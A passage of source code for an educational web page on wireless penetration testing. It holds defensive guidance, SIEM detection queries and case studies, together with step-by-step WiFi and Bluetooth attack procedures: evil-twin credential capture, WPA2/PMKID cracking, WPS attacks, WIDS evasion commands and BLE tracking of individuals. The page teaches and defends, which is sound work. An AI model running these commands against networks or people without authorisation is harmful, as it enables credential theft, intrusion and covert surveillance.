  { strategy: "Strong Encryption", description: "WPA3-Enterprise or WPA2-Enterprise with EAP-TLS minimum", priority: "Critical", implementation: "Upgrade APs, configure RADIUS" },
  { strategy: "Complex Passwords", description: "20+ character random PSKs for any personal networks", priority: "Critical", implementation: "Password manager, regular rotation" },
  { strategy: "Disable WPS", description: "Remove PIN-based authentication attack surface completely", priority: "High", implementation: "AP configuration, verify with wash scan" },
  { strategy: "Certificate Pinning", description: "Clients must validate specific server certificate", priority: "High", implementation: "MDM policy, supplicant configuration" },
  { strategy: "Network Segmentation", description: "Separate guest, IoT, BYOD, and corporate traffic via VLANs", priority: "High", implementation: "Dynamic VLAN assignment via RADIUS" },
  { strategy: "Wireless IDS/IPS", description: "24/7 monitoring for rogue APs, deauth attacks, evil twins", priority: "High", implementation: "Dedicated sensors or AP-integrated" },
  { strategy: "Regular Audits", description: "Quarterly penetration testing of wireless infrastructure", priority: "Medium", implementation: "Internal or third-party assessments" },
  { strategy: "Client Isolation", description: "Prevent direct client-to-client communication on same AP", priority: "Medium", implementation: "AP configuration, guest network default" },
  { strategy: "MAC Randomization Awareness", description: "Understand that MAC filtering is security theater", priority: "Low", implementation: "Don't rely on MAC-based controls" },
  { strategy: "Deauth Protection", description: "802.11w (PMF) to protect management frames", priority: "High", implementation: "Enable MFP on AP and require on clients" },
];

const certifications = [
  { cert: "OSWP", org: "OffSec", description: "OffSec Wireless Professional - hands-on wireless pentesting", difficulty: "Intermediate", focus: "Practical attacks" },
  { cert: "CWNA", org: "CWNP", description: "Certified Wireless Network Administrator - foundation", difficulty: "Beginner", focus: "WiFi fundamentals" },
  { cert: "CWSP", org: "CWNP", description: "Certified Wireless Security Professional - security focus", difficulty: "Intermediate", focus: "Wireless security" },
  { cert: "CWAP", org: "CWNP", description: "Certified Wireless Analysis Professional - protocol analysis", difficulty: "Advanced", focus: "Packet analysis" },
  { cert: "CWNE", org: "CWNP", description: "Certified Wireless Network Expert - highest CWNP level", difficulty: "Expert", focus: "Complete mastery" },
  { cert: "GAWN", org: "GIAC", description: "GIAC Assessing Wireless Networks - enterprise focus", difficulty: "Intermediate", focus: "Enterprise testing" },
];

// Advanced attack scenarios with detailed steps
const advancedAttackScenarios = [
  {
    name: "Corporate WiFi Compromise (Full Kill Chain)",
    difficulty: "Advanced",
    time: "2-4 hours",
    prerequisites: ["Monitor mode adapter", "hostapd-wpe", "Wordlist"],
    steps: [
      { step: 1, action: "Reconnaissance", detail: "Identify corporate SSID, channel, and EAP type using airodump-ng" },
      { step: 2, action: "Setup Evil Twin", detail: "Configure hostapd-wpe with matching SSID and channel" },
      { step: 3, action: "Deauth Clients", detail: "Force clients to disconnect using aireplay-ng -0" },
      { step: 4, action: "Capture Credentials", detail: "Wait for clients to reconnect to rogue AP" },
      { step: 5, action: "Crack MSCHAPv2", detail: "Use asleap or hashcat -m 5500 on captured challenge/response" },
      { step: 6, action: "Access Network", detail: "Connect with recovered credentials" },
      { step: 7, action: "Post-Exploitation", detail: "Enumerate internal network, identify sensitive systems" },
    ],
    detection: "WIDS alerts on SSID spoofing, unusual deauth frames, RADIUS authentication failures",
    mitigation: "Enforce certificate validation, deploy WIPS, use EAP-TLS with client certs",
  },
  {
    name: "WPA2-PSK Network Breach",
    difficulty: "Intermediate",
    time: "30 min - several days",
    prerequisites: ["Monitor mode adapter", "Hashcat + GPU", "Quality wordlist"],
    steps: [
      { step: 1, action: "Target Selection", detail: "Identify target network with airodump-ng, note BSSID/channel" },
      { step: 2, action: "Capture Handshake", detail: "Wait for client connection or deauth to force reconnect" },
      { step: 3, action: "Alternative: PMKID", detail: "Use hcxdumptool to capture PMKID without client" },
      { step: 4, action: "Convert Format", detail: "hcxpcapngtool -o hash.22000 capture.pcapng" },
      { step: 5, action: "GPU Cracking", detail: "hashcat -m 22000 -a 0 hash.22000 rockyou.txt -r best64.rule" },
      { step: 6, action: "Rule-based Attack", detail: "Apply mutation rules for password variations" },
      { step: 7, action: "Connect & Pivot", detail: "Join network with cracked PSK, enumerate hosts" },
    ],
    detection: "Deauth flood detection, unusual probe responses, new MAC addresses after attack",
    mitigation: "Use 20+ char random passphrase, enable WPA3-SAE, rotate PSK regularly",
  },
  {
    name: "IoT Device Exploitation via WiFi",
    difficulty: "Intermediate",
    time: "1-2 hours",
    prerequisites: ["Monitor mode adapter", "Wireshark", "Device-specific tools"],
    steps: [
      { step: 1, action: "Device Discovery", detail: "Identify IoT devices by MAC OUI and probe requests" },
      { step: 2, action: "Traffic Analysis", detail: "Capture and analyze device communication patterns" },
      { step: 3, action: "Protocol Identification", detail: "Identify HTTP, MQTT, CoAP, or proprietary protocols" },
      { step: 4, action: "Credential Sniffing", detail: "Look for cleartext credentials or API keys" },
      { step: 5, action: "Replay Attacks", detail: "Capture and replay commands to control devices" },
      { step: 6, action: "Firmware Analysis", detail: "Extract and analyze device firmware for hardcoded creds" },
      { step: 7, action: "Lateral Movement", detail: "Use compromised IoT device to access main network" },
    ],
    detection: "Unusual traffic patterns from IoT VLAN, anomalous device behavior, new connections",
    mitigation: "Segment IoT on separate VLAN, monitor traffic, update firmware, disable UPnP",
  },
  {
    name: "Captive Portal Credential Harvesting",
    difficulty: "Intermediate",
    time: "30 min - 2 hours",
    prerequisites: ["Monitor mode adapter", "WiFi-Pumpkin or Fluxion", "Social engineering"],
    steps: [
      { step: 1, action: "Clone Target Portal", detail: "Capture or recreate the target network's login page" },
      { step: 2, action: "Setup Rogue AP", detail: "Configure evil twin with captive portal redirect" },
      { step: 3, action: "DNS/DHCP Config", detail: "Redirect all DNS to captive portal server" },
      { step: 4, action: "Deauth Legitimate AP", detail: "Force clients to disconnect and search for networks" },
      { step: 5, action: "Credential Capture", detail: "Log username/password from portal submissions" },
      { step: 6, action: "Verify Credentials", detail: "Test captured creds against real authentication" },
    ],
    detection: "Multiple APs with same SSID, certificate warnings, unusual redirect behavior",
    mitigation: "User awareness training, HTTPS enforcement, certificate validation policies",
  },
];

// SIEM detection queries for wireless attacks
const siemDetectionQueries = {
  splunk: [
    {
      name: "Deauth Flood Detection",
      query: `index=wireless sourcetype=wids
| where frame_type="deauthentication" OR frame_type="disassociation"
| stats count by src_mac, dst_mac, ssid, span=1m
| where count > 10
| table _time, src_mac, dst_mac, ssid, count`,
      description: "Detect excessive deauthentication frames indicating attack",
    },
    {
      name: "Rogue AP Detection",
      query: `index=wireless sourcetype=wids
| dedup bssid
| lookup authorized_aps.csv bssid OUTPUT authorized
| where isnull(authorized) OR authorized="false"
| table _time, ssid, bssid, channel, signal_strength, vendor`,
      description: "Identify unauthorized access points in the environment",
    },
    {
      name: "Evil Twin Detection",
      query: `index=wireless sourcetype=wids
| stats dc(bssid) as unique_bssids, values(bssid) as bssids by ssid
| where unique_bssids > 1
| lookup authorized_aps.csv ssid OUTPUT expected_bssid
| where bssids!=expected_bssid`,
      description: "Detect multiple BSSIDs broadcasting same SSID",
    },
    {
      name: "RADIUS Auth Failures",
      query: `index=network sourcetype=radius
| where result="Access-Reject" OR result="Access-Challenge"
| stats count by user, calling_station_id, nas_ip, span=1h
| where count > 5
| table _time, user, calling_station_id, nas_ip, count`,
      description: "Track failed enterprise WiFi authentication attempts",
    },
  ],
  sentinel: [
    {
      name: "Wireless Anomaly Detection",
      query: `WirelessLogs
| where TimeGenerated > ago(1h)
| where EventType in ("Deauth", "Disassoc", "AuthFailure")
| summarize EventCount = count() by SourceMAC, TargetMAC, SSID, bin(TimeGenerated, 5m)
| where EventCount > 20
| project TimeGenerated, SourceMAC, TargetMAC, SSID, EventCount`,
      description: "Detect wireless attack indicators using KQL",
    },
    {
      name: "New SSID Detection",
      query: `WirelessLogs
| where TimeGenerated > ago(24h)
| where EventType == "BeaconFrame"
| distinct SSID, BSSID
| join kind=leftanti (
    WirelessLogs
    | where TimeGenerated between(ago(30d) .. ago(24h))
    | distinct SSID, BSSID
) on SSID, BSSID
| project SSID, BSSID, FirstSeen = now()`,
      description: "Identify newly appeared wireless networks",
    },
  ],
  elastic: [
    {
      name: "Wireless Attack Pattern",
      query: `{
  "query": {
    "bool": {
      "must": [
        { "range": { "@timestamp": { "gte": "now-1h" }}},
        { "terms": { "event.type": ["deauth", "disassoc", "probe_response"]}}
      ]
    }
  },
  "aggs": {
    "by_source": {
      "terms": { "field": "source.mac" },
      "aggs": {
        "event_count": { "value_count": { "field": "@timestamp" }}
      }
    }
  }
}`,
      description: "Aggregate wireless events by source MAC for anomaly detection",
    },
  ],
};

// Lab exercises with detailed instructions
const labExercises = [
  {
    title: "Lab 1: WEP Cracking Fundamentals",
    level: "Beginner",
    time: "30 minutes",
    objective: "Understand WEP weaknesses by cracking a WEP-protected network",
    setup: "Configure old router with WEP 64-bit key",
    tools: ["aircrack-ng suite", "Monitor mode adapter"],
    steps: [
      "Enable monitor mode: airmon-ng start wlan0",
      "Identify target: airodump-ng wlan0mon",
      "Focus on target: airodump-ng -c [channel] --bssid [BSSID] -w wep_capture wlan0mon",
      "Inject traffic: aireplay-ng -3 -b [BSSID] wlan0mon",
      "Wait for 40,000+ IVs (watch #Data column)",
      "Crack: aircrack-ng wep_capture-01.cap",
      "Key should appear in under 5 minutes",
    ],
    learningOutcome: "Understand why WEP is fundamentally broken and should never be used",
  },
  {
    title: "Lab 2: WPA2 Handshake Capture & Cracking",
    level: "Beginner",
    time: "45 minutes",
    objective: "Capture WPA2 4-way handshake and perform dictionary attack",
    setup: "Configure router with WPA2-PSK using password from rockyou.txt",
    tools: ["aircrack-ng suite", "rockyou.txt wordlist"],
    steps: [
      "Enable monitor mode and scan for targets",
      "Start capture on target channel/BSSID with -w flag",
      "In new terminal, deauth a client: aireplay-ng -0 5 -a [BSSID] -c [CLIENT] wlan0mon",
      "Watch for 'WPA handshake' message in airodump-ng",
      "Crack with dictionary: aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
      "Observe password recovery time",
    ],
    learningOutcome: "Understand importance of strong passwords and handshake-based attacks",
  },
  {
    title: "Lab 3: PMKID Attack (Clientless)",
    level: "Intermediate",
    time: "30 minutes",
    objective: "Extract PMKID from AP without requiring any connected clients",
    setup: "WPA2-PSK router with weak password",
    tools: ["hcxdumptool", "hcxpcapngtool", "hashcat"],
    steps: [
      "Capture PMKID: hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=[BSSID] --filtermode=2 --enable_status=1",
      "Wait for PMKID capture (watch output for 'PMKID')",
      "Convert: hcxpcapngtool -o hash.22000 pmkid.pcapng",
      "Verify hash: cat hash.22000 (should start with WPA*02*)",
      "Crack: hashcat -m 22000 hash.22000 rockyou.txt",
      "Compare speed vs full handshake cracking",
    ],
    learningOutcome: "Modern attacks don't require client deauthentication",
  },
  {
    title: "Lab 4: WPS Pixie Dust Attack",
    level: "Intermediate",
    time: "20 minutes",
    objective: "Exploit weak random number generation in WPS implementations",
    setup: "Router with WPS enabled (vulnerable model preferred)",
    tools: ["wash", "reaver", "bully"],
    steps: [
      "Scan for WPS: wash -i wlan0mon",
      "Note targets with 'Lck' column showing 'No'",
      "Try Pixie Dust: reaver -i wlan0mon -b [BSSID] -K 1 -vv",
      "If successful, PIN and PSK appear instantly",
      "If not vulnerable, try standard bruteforce: reaver -i wlan0mon -b [BSSID] -vv",
      "Alternative: bully -b [BSSID] -c [channel] wlan0mon",
    ],
    learningOutcome: "WPS is a major vulnerability even with strong WPA2 passwords",
  },
  {
    title: "Lab 5: Evil Twin with Captive Portal",
    level: "Advanced",
    time: "60 minutes",
    objective: "Create rogue AP with fake portal to capture credentials",
    setup: "Target network for cloning, second wireless adapter",
    tools: ["hostapd", "dnsmasq", "apache/nginx", "iptables"],
    steps: [
      "Create hostapd.conf with target SSID and channel",
      "Configure dnsmasq for DHCP and DNS redirect",
      "Setup web server with cloned login portal",
      "Configure iptables to redirect HTTP traffic",
      "Start evil twin: hostapd hostapd.conf",
      "Deauth clients from legitimate AP",
      "Monitor portal logs for credential submissions",
    ],
    learningOutcome: "Social engineering combined with technical attacks is highly effective",
  },
  {
    title: "Lab 6: Enterprise WiFi Attack (hostapd-wpe)",
    level: "Advanced",
    time: "90 minutes",
    objective: "Capture and crack enterprise WiFi credentials",
    setup: "WPA2-Enterprise network with PEAP/MSCHAPv2",
    tools: ["hostapd-wpe", "asleap", "hashcat"],
    steps: [
      "Identify target enterprise SSID and authentication type",
      "Configure hostapd-wpe.conf with matching parameters",
      "Generate self-signed certificate for RADIUS",
      "Start rogue AP: hostapd-wpe hostapd-wpe.conf",
      "Deauth clients from legitimate AP",
      "Wait for clients to connect and authenticate",
      "Review hostapd-wpe.log for captured credentials",
      "Crack with asleap: asleap -C [challenge] -R [response] -W wordlist.txt",
    ],
    learningOutcome: "Certificate validation is critical for enterprise WiFi security",
  },
];

// Wireless IDS evasion techniques
const widsEvasionTechniques = [
  {
    technique: "Low and Slow Deauth",
    description: "Send deauth frames at intervals below WIDS threshold detection",
    command: "aireplay-ng -0 1 -a BSSID wlan0mon && sleep 30 && repeat",
    effectiveness: "Medium",
    detection: "Cumulative analysis over longer time periods",
  },
  {
    technique: "Channel Hopping",
    description: "Rapidly change channels during attack to avoid single-channel monitoring",
    command: "while true; do iwconfig wlan0mon channel $((RANDOM % 13 + 1)); sleep 0.5; done",
    effectiveness: "Low-Medium",
    detection: "Multi-channel WIDS deployment",
  },
  {
    technique: "MAC Randomization",
    description: "Change source MAC address for each attack frame",
    command: "macchanger -r wlan0mon (before each attack)",
    effectiveness: "Medium",
    detection: "Behavioral analysis, not MAC-based",
  },
  {
    technique: "Power Level Reduction",
    description: "Reduce transmission power to minimize detection range",
    command: "iwconfig wlan0mon txpower 1",
    effectiveness: "Medium",
    detection: "Sensors close to target will still detect",
  },
  {
    technique: "Passive Reconnaissance Only",
    description: "Avoid any active transmission, only passive listening",
    command: "airodump-ng wlan0mon (no injection)",
    effectiveness: "High",
    detection: "Undetectable without physical security",
  },
  {
    technique: "Time-based Attack Windows",
    description: "Attack during off-hours when WIDS alerts less monitored",
    command: "Scheduled tasks outside business hours",
    effectiveness: "Medium",
    detection: "24/7 SOC monitoring, automated alerting",
  },
];

// Real-world case studies
const caseStudies = [
  {
    title: "TJX Companies Data Breach (2007)",
    type: "WEP Exploitation",
    impact: "94 million credit cards compromised, $256M+ in costs",
    attackVector: "Attackers wardrove TJX stores, found WEP-protected WiFi, cracked keys, and pivoted to internal network to install packet sniffers",
    lessons: ["WEP was known broken for years before this attack", "Wireless security directly impacts PCI compliance", "Physical security and wireless security must align"],
    timeline: "2005-2007 (breach), 2007 (discovery)",
  },
  {
    title: "APT Attack via Hotel WiFi",
    type: "Evil Twin / MITM",
    impact: "Corporate espionage, intellectual property theft",
    attackVector: "Attackers set up rogue AP in hotel hosting business conference, captured credentials of executives connecting to 'Hotel_WiFi'",
    lessons: ["Use VPN on untrusted networks", "Verify network authenticity before connecting", "Corporate travel security policies needed"],
    timeline: "Ongoing threat pattern",
  },
  {
    title: "KRACK Attack Disclosure (2017)",
    type: "Protocol Vulnerability",
    impact: "All WPA2 implementations potentially affected",
    attackVector: "Key Reinstallation Attack exploited nonce reuse in 4-way handshake to decrypt traffic and potentially inject packets",
    lessons: ["Even 'secure' protocols can have implementation flaws", "Prompt patching is critical", "Defense in depth (HTTPS, VPN) provides backup protection"],
    timeline: "October 2017 disclosure",
  },
  {
    title: "Dragonblood WPA3 Vulnerabilities (2019)",
    type: "Protocol Vulnerability",
    impact: "New WPA3 standard had implementation flaws",
    attackVector: "Side-channel attacks on SAE handshake allowed password recovery in some implementations",
    lessons: ["New standards need thorough security review", "Implementation matters as much as protocol design", "Transition modes can create downgrade opportunities"],
    timeline: "April 2019 disclosure",
  },
];

// Advanced Bluetooth attack details
const advancedBluetoothAttacks = [
  {
    name: "BLE MITM with GATTacker",
    description: "Intercept and modify BLE communications between device and app",
    steps: [
      "Identify target device: hcitool lescan",
      "Clone device: gattacker -s [MAC]",
      "Start relay: node ws-slave.js && node advertise.js",
      "Victim app connects to rogue device",
      "All GATT operations pass through attacker",
    ],
    tools: ["GATTacker", "Ubertooth", "nRF52 dongle"],
    defense: "BLE bonding, secure pairing, MITM-resistant profiles",
  },
  {
    name: "Bluetooth Classic PIN Cracking",
    description: "Capture and crack Bluetooth pairing exchange",
    steps: [
      "Enable Bluetooth sniffing with Ubertooth",
      "Capture pairing exchange between devices",
      "Extract E1/E3 values from packet capture",
      "Offline brute-force 4-digit PIN (10,000 combinations)",
    ],
    tools: ["Ubertooth One", "Wireshark", "btcrack"],
    defense: "Use SSP (Secure Simple Pairing), longer PINs",
  },
  {
    name: "BLE Tracking and Surveillance",
    description: "Track individuals via BLE advertising packets",
    steps: [
      "Deploy BLE scanners at multiple locations",
      "Capture advertising packets with device addresses",
      "Correlate MAC addresses across locations",
      "Build movement profiles of targets",
    ],
    tools: ["Raspberry Pi + BLE dongle", "Custom scripts"],
    defense: "MAC address randomization (most modern devices)",
  },
];

// Hashcat optimization tips
const hashcatOptimization = [
  { tip: "Use -O flag for optimized kernels", impact: "2-3x speed increase", command: "hashcat -m 22000 -O hash.22000 wordlist.txt" },
  { tip: "Use -w 3 for workload profile", impact: "Maximum GPU utilization", command: "hashcat -m 22000 -w 3 hash.22000 wordlist.txt" },
  { tip: "Apply rules for password mutations", impact: "Much better coverage", command: "hashcat -m 22000 -r best64.rule hash.22000 wordlist.txt" },
  { tip: "Use combinator attacks", impact: "Word1+Word2 combinations", command: "hashcat -m 22000 -a 1 hash.22000 list1.txt list2.txt" },
  { tip: "Mask attacks for known patterns", impact: "Targeted character positions", command: "hashcat -m 22000 -a 3 hash.22000 ?d?d?d?d?d?d?d?d" },
  { tip: "Use prince processor for phrases", impact: "Generate word combinations", command: "pp64 wordlist.txt | hashcat -m 22000 hash.22000" },
  { tip: "Distributed cracking with --brain", impact: "Coordinate multiple systems", command: "hashcat --brain-server on node1, --brain-client on others" },
];

// =============================================================================
// MAIN COMPONENT
// =============================================================================

const WirelessPentestingPage: React.FC = () => {
  const [tabValue, setTabValue] = useState(0);

  const handleTabChange = (_event: React.SyntheticEvent, newValue: number) => {
    setTabValue(newValue);
  };

  const pageContext = `This page covers wireless penetration testing techniques including WiFi security protocols (WEP, WPA, WPA2, WPA3), attack methodologies, deauthentication attacks, evil twin attacks, PMKID capture, WPS vulnerabilities, and wireless security tools like Aircrack-ng and Hashcat.`;

  return (
    <LearnPageLayout pageTitle="Wireless Penetration Testing" pageContext={pageContext}>
    <Box sx={{ p: 3 }}>
      <Box sx={{ mb: 3 }}>
        <Chip
          component={Link}
          to="/learn"
          icon={<ArrowBackIcon />}
          label="Back to Learning Hub"
          clickable
          variant="outlined"
          sx={{ borderRadius: 2 }}
        />
      </Box>
      <Typography variant="h4" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
        <WifiIcon color="primary" />
        Wireless Penetration Testing
      </Typography>
      <Typography variant="body1" color="text.secondary" paragraph>
        Comprehensive guide to assessing wireless network security
      </Typography>

      <Alert severity="warning" sx={{ mb: 3 }}>
        <AlertTitle>Legal & Ethical Notice</AlertTitle>
        Only perform wireless testing on networks you own or have explicit written authorization to test.
        Unauthorized access to wireless networks is illegal in most jurisdictions.
      </Alert>

      <Paper sx={{ mb: 3 }}>
        <Tabs
          value={tabValue}
          onChange={handleTabChange}
          variant="scrollable"
          scrollButtons="auto"
        >
          <Tab icon={<SchoolIcon />} label="Fundamentals" />
          <Tab icon={<WifiIcon />} label="Overview" />
          <Tab icon={<LockIcon />} label="WiFi Security" />
          <Tab icon={<BugReportIcon />} label="Attack Types" />
          <Tab icon={<BuildIcon />} label="Tools" />
          <Tab icon={<BluetoothIcon />} label="Bluetooth & RF" />
          <Tab icon={<BusinessIcon />} label="Enterprise" />
          <Tab icon={<ShieldIcon />} label="Defense" />
          <Tab icon={<GavelIcon />} label="Methodology" />
          <Tab icon={<TerminalIcon />} label="Labs" />
          <Tab icon={<RadarIcon />} label="SIEM Detection" />
        </Tabs>
      </Paper>

      {/* Tab 0: Wireless Fundamentals for Beginners */}
      <TabPanel value={tabValue} index={0}>
        <Typography variant="h5" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <SchoolIcon color="primary" />
          Wireless Fundamentals for Beginners
        </Typography>
        
        <Alert severity="success" sx={{ mb: 3 }}>
          <AlertTitle>Start Here If You're New to Wireless Security</AlertTitle>
          This section explains wireless concepts from the ground up. You'll learn how WiFi actually works,
          understand the invisible radio waves carrying your data, and discover why wireless networks are
          both incredibly useful and inherently vulnerable to attacks.
        </Alert>

        <Typography variant="h6" gutterBottom sx={{ mt: 3, display: "flex", alignItems: "center", gap: 1 }}>
          <MenuBookIcon color="primary" />
          Core Concepts Explained
        </Typography>

        {Object.entries(wirelessFundamentals).map(([key, section]) => (
          <Accordion key={key} sx={{ mb: 1 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                <Avatar sx={{ bgcolor: "primary.main", width: 32, height: 32 }}>
                  <TipsAndUpdatesIcon fontSize="small" />
                </Avatar>
                <Typography fontWeight="bold">{section.title}</Typography>
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Alert severity="info" sx={{ mb: 2 }}>
                <AlertTitle>Simple Explanation</AlertTitle>
                <Typography variant="body2" sx={{ whiteSpace: "pre-line" }}>
                  {section.beginnerExplanation}
                </Typography>
              </Alert>
              
              <Accordion sx={{ mb: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="subtitle2" color="text.secondary">
                    ğŸ”¬ Technical Details (Click to expand)
                  </Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ whiteSpace: "pre-line", fontFamily: "monospace", fontSize: "0.85rem" }}>
                    {section.technicalDetails}
                  </Typography>
                </AccordionDetails>
              </Accordion>

              <Typography variant="subtitle2" color="primary" gutterBottom>Key Takeaways:</Typography>
              <List dense>
                {section.keyPoints.map((point, idx) => (
                  <ListItem key={idx}>
                    <ListItemIcon>
                      <Avatar sx={{ bgcolor: "primary.main", width: 24, height: 24, fontSize: "0.75rem" }}>
                        {idx + 1}
                      </Avatar>
                    </ListItemIcon>
                    <ListItemText primary={point} />
                  </ListItem>
                ))}
              </List>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 4 }} />

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <TimelineIcon color="primary" />
          Visual Learning Aids
        </Typography>
        <Typography paragraph color="text.secondary">
          Complex concepts are easier to understand with diagrams. These ASCII diagrams show how
          WiFi communication actually works under the hood.
        </Typography>

        {Object.entries(visualLearningAids).map(([key, visual]) => (
          <Accordion key={key} sx={{ mb: 1 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                <ScienceIcon color="secondary" />
                <Box>
                  <Typography fontWeight="bold">{visual.title}</Typography>
                  <Typography variant="body2" color="text.secondary">{visual.description}</Typography>
                </Box>
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Paper sx={{ p: 2, bgcolor: "grey.900", overflow: "auto" }}>
                <Typography
                  component="pre"
                  sx={{
                    fontFamily: "monospace",
                    fontSize: "0.75rem",
                    lineHeight: 1.2,
                    color: "success.light",
                    whiteSpace: "pre",
                    m: 0,
                  }}
                >
                  {visual.diagram}
                </Typography>
              </Paper>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 4 }} />

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <MenuBookIcon color="primary" />
          Comprehensive Wireless Glossary
        </Typography>
        <Typography paragraph color="text.secondary">
          Master the vocabulary of wireless security. Click any term to learn more.
        </Typography>

        <Grid container spacing={2}>
          {Object.entries(expandedGlossary).map(([key, item]) => (
            <Grid item xs={12} sm={6} md={4} key={key}>
              <Accordion>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Box>
                    <Typography fontWeight="bold" color="primary">{item.term}</Typography>
                    <Typography variant="body2" color="text.secondary">{item.shortDef}</Typography>
                  </Box>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="subtitle2" gutterBottom>{item.fullName}</Typography>
                  <Typography variant="body2" paragraph>{item.longDef}</Typography>
                  <Chip label={`Example: ${item.example}`} size="small" variant="outlined" />
                </AccordionDetails>
              </Accordion>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 4 }} />

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <WarningIcon color="error" />
          Real-World Wireless Security Incidents
        </Typography>
        <Typography paragraph color="text.secondary">
          Learning from past breaches helps understand why wireless security matters. These incidents
          shaped the industry and drove security improvements.
        </Typography>

        <Grid container spacing={2}>
          {realWorldIncidents.map((incident, idx) => (
            <Grid item xs={12} md={6} key={idx}>
              <Card variant="outlined" sx={{ height: "100%" }}>
                <CardContent>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                    <Typography variant="h6" color="error">{incident.name}</Typography>
                    <Chip label={incident.year} size="small" />
                  </Box>
                  <Chip label={incident.type} size="small" variant="outlined" color="warning" sx={{ mb: 2 }} />
                  
                  <Alert severity="error" sx={{ mb: 2 }}>
                    <AlertTitle>Impact</AlertTitle>
                    {incident.impact}
                  </Alert>

                  <Typography variant="body2" paragraph>{incident.description}</Typography>

                  <Accordion>
                    <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                      <Typography variant="subtitle2">Attack Chain & Lessons</Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="subtitle2" color="primary" gutterBottom>Attack Chain:</Typography>
                      <Paper sx={{ p: 1, mb: 2, bgcolor: "action.hover" }}>
                        <Typography variant="body2" fontFamily="monospace" fontSize="0.8rem">
                          {incident.attackChain}
                        </Typography>
                      </Paper>
                      
                      <Typography variant="subtitle2" color="success.main" gutterBottom>Lessons Learned:</Typography>
                      <List dense>
                        {incident.lessonsLearned.map((lesson, lidx) => (
                          <ListItem key={lidx}>
                            <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                            <ListItemText primary={lesson} primaryTypographyProps={{ variant: "body2" }} />
                          </ListItem>
                        ))}
                      </List>
                    </AccordionDetails>
                  </Accordion>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 4 }} />

        <WirelessQuizSection />

        <Divider sx={{ my: 4 }} />

        <Alert severity="success">
          <AlertTitle>Ready to Continue?</AlertTitle>
          Now that you understand the fundamentals, proceed to the <strong>Overview</strong> tab for
          a broader introduction to wireless penetration testing, then dive into <strong>WiFi Security</strong>
          for protocol-specific details and attack techniques.
        </Alert>
      </TabPanel>

      {/* Tab 1: Overview */}
      <TabPanel value={tabValue} index={1}>
        <Typography variant="h5" gutterBottom>What is Wireless Penetration Testing?</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Simple Explanation</AlertTitle>
          Think of your wireless network like a house with invisible walls. Unlike wired networks where 
          you need physical access, wireless signals travel through air and can be "heard" by anyone 
          within range. Wireless penetration testing is like hiring a security expert to try breaking 
          into your house to find the weak spots - except they're testing your WiFi network.
        </Alert>

        <Typography paragraph>
          <strong>Wireless penetration testing</strong> is the process of evaluating the security of wireless 
          networks by simulating real-world attacks. Unlike traditional network testing where an attacker 
          needs physical access to plug in a cable, wireless networks broadcast signals that anyone with 
          the right equipment can intercept from outside your building - even from a car parked across 
          the street.
        </Typography>

        <Typography paragraph>
          This makes wireless networks particularly vulnerable because:
        </Typography>

        <Grid container spacing={2} sx={{ mb: 3 }}>
          {[
            { icon: <PublicIcon />, title: "No Physical Barrier", desc: "Signals extend beyond walls and fences" },
            { icon: <VisibilityIcon />, title: "Invisible Traffic", desc: "You can't see who's listening to your network" },
            { icon: <DevicesIcon />, title: "Many Devices", desc: "Phones, laptops, IoT all connect wirelessly" },
            { icon: <LockOpenIcon />, title: "Legacy Protocols", desc: "Old devices may use weak encryption" },
          ].map((item) => (
            <Grid item xs={12} sm={6} md={3} key={item.title}>
              <Card sx={{ height: "100%", textAlign: "center" }}>
                <CardContent>
                  <Box sx={{ color: "primary.main", mb: 1 }}>{item.icon}</Box>
                  <Typography variant="subtitle1" fontWeight="bold">{item.title}</Typography>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Why Wireless Security Matters</Typography>
        <Typography paragraph>
          A compromised wireless network can give attackers the same access as if they were sitting 
          at a desk in your office. From there, they can:
        </Typography>

        <List>
          {[
            "Intercept sensitive data (emails, passwords, financial information)",
            "Access internal systems and databases",
            "Launch attacks on other networks using your connection",
            "Install malware on connected devices",
            "Pivot deeper into the corporate network",
          ].map((item, idx) => (
            <ListItem key={idx}>
              <ListItemIcon><WarningIcon color="error" /></ListItemIcon>
              <ListItemText primary={item} />
            </ListItem>
          ))}
        </List>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Wireless Standards Overview</Typography>
        <TableContainer component={Paper}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Standard</strong></TableCell>
                <TableCell><strong>Frequency</strong></TableCell>
                <TableCell><strong>Max Speed</strong></TableCell>
                <TableCell><strong>Year</strong></TableCell>
                <TableCell><strong>Status</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {wifiStandards.map((row) => (
                <TableRow key={row.standard}>
                  <TableCell><Chip label={row.standard} size="small" /></TableCell>
